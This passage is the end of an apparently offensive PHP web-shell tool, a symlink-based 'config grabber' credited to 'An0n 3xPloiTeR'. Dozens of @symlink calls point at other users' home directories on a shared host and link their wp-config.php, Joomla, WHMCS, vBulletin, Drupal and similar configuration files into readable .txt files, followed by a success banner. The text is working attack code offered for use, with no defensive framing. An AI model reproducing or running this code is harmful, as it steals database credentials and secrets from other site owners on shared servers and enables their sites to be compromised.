@symlink('/home6/' . $user . '/public_html/joomla/configuration.php', $user . '-Joomla3.txt');
@symlink('/home6/' . $user . '/public_html/main/configuration.php', $user . '-Joomla4.txt');
@symlink('/home6/' . $user . '/public_html/home/configuration.php', $user . '-Joomla5.txt');
@symlink('/home6/' . $user . '/public_html/site/configuration.php', $user . '-Joomla6.txt');
@symlink('/home6/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
@symlink('/home6/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
@symlink('/home6/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
@symlink('/home6/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
@symlink('/home6/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
@symlink('/home6/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
@symlink('/home6/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
@symlink('/home6/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
@symlink('/home6/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
@symlink('/home6/' . $user . '/public_html/admin/conf.php', $user . '-Other1.txt');
@symlink('/home6/' . $user . '/public_html/admin/config.php', $user . '-Other2.txt');
@symlink('/home6/' . $user . '/public_html/conf_global.php', $user . '-invisio.txt');
@symlink('/home6/' . $user . '/public_html/include/db.php', $user . '-Other3.txt');
@symlink('/home6/' . $user . '/public_html/connect.php', $user . '-Other4.txt');
@symlink('/home6/' . $user . '/public_html/mk_conf.php', $user . '-mk-portale1.txt');
@symlink('/home6/' . $user . '/public_html/include/config.php', $user . '-Other5.txt');
@symlink('/home6/' . $user . '/public_html/settings.php', $user . '-Smf.txt');
@symlink('/home6/' . $user . '/public_html/includes/functions.php', $user . '-phpbb3.txt');
@symlink('/home6/' . $user . '/public_html/include/db.php', $user . '-infinity.txt');
@symlink('/home7/' . $user . '/public_html/inc/config.php', $user . '-MyBB.txt');
@symlink('/home7/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home7/' . $user . '/public_html/includes/configure.php', $user . '-Oscommerce.txt');
@symlink('/home7/' . $user . '/public_html/lib/config.php', $user . '-Balitbang.txt');
@symlink('/home7/' . $user . '/public_html/config/koneksi.php', $user . '-Lokomedia.txt');
@symlink('/home7/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
@symlink('/home7/' . $user . '/public_html/includes/config.php', $user . '-vBulletin2.txt');
@symlink('/home7/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
@symlink('/home7/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
@symlink('/home7/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
@symlink('/home7/' . $user . '/public_html/forum/includes/config.php', $user . '-Phpbb2.txt');
@symlink('/home7/' . $user . '/public_html/wp-config.php', $user . '-Wordpress1.txt');
@symlink('/home7/' . $user . '/public_html/blog/wp-config.php', $user . '-Wordpress2.txt');
@symlink('/home7/' . $user . '/public_html/wp/wp-config.php', $user . '-Wordpress3.txt');
@symlink('/home7/' . $user . '/public_html/home/wp-config.php', $user . '-Wordpress4.txt');
@symlink('/home7/' . $user . '/public_html/main/wp-config.php', $user . '-Wordpress5.txt');
@symlink('/home7/' . $user . '/public_html/site/wp-config.php', $user . '-Wordpress6.txt');
@symlink('/home7/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
@symlink('/home7/' . $user . '/public_html/blog/configuration.php', $user . '-Joomla2.txt');
@symlink('/home7/' . $user . '/public_html/joomla/configuration.php', $user . '-Joomla3.txt');
@symlink('/home7/' . $user . '/public_html/main/configuration.php', $user . '-Joomla4.txt');
@symlink('/home7/' . $user . '/public_html/home/configuration.php', $user . '-Joomla5.txt');
@symlink('/home7/' . $user . '/public_html/site/configuration.php', $user . '-Joomla6.txt');
@symlink('/home7/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
@symlink('/home7/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
@symlink('/home7/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
@symlink('/home7/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
@symlink('/home7/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
@symlink('/home7/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
@symlink('/home7/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
@symlink('/home7/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
@symlink('/home7/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
@symlink('/home7/' . $user . '/public_html/admin/conf.php', $user . '-Other1.txt');
@symlink('/home7/' . $user . '/public_html/admin/config.php', $user . '-Other2.txt');
@symlink('/home7/' . $user . '/public_html/conf_global.php', $user . '-invisio.txt');
@symlink('/home7/' . $user . '/public_html/include/db.php', $user . '-Other3.txt');
@symlink('/home7/' . $user . '/public_html/connect.php', $user . '-Other4.txt');
@symlink('/home7/' . $user . '/public_html/mk_conf.php', $user . '-mk-portale1.txt');
@symlink('/home7/' . $user . '/public_html/include/config.php', $user . '-Other5.txt');
@symlink('/home7/' . $user . '/public_html/settings.php', $user . '-Smf.txt');
@symlink('/home7/' . $user . '/public_html/includes/functions.php', $user . '-phpbb3.txt');
@symlink('/home7/' . $user . '/public_html/include/db.php', $user . '-infinity.txt');
                            }
                            echo '
                            <div class="symlink_done">
                                <font><br>Congrats Symlinking of Config Files Done !!!</font><br>
                                <font><br>
                                    <a target="_blank" href="UeXploiT">Config List</a>
                                </font>
                            </div>
                            <br><br>
                            ';
                        }
                    }
                ?>
            </font>
        <div class="footer">
            <font>
            Developed By 
                <span style="color: red;">
                    <a href="https://www.google.com/search?q=An0n 3xPloiTeR" target="_blank">An0n 3xPloiTeR</a>
                </span>
            </font>
        </div>
    </body>
</html>
